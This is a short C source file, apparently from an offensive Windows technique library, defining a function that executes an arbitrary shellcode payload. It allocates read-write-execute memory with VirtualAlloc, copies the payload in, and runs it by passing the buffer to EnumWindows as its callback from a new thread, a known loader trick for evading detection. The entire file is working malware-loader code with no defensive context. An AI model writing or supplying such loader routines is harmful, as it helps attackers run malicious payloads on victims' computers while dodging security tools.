#include "Win32Helper.h"

VOID InvokeEnumWindowsCallbackRoutine(LPVOID lpParameter)
{
	EnumWindows((WNDENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumWindowsCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}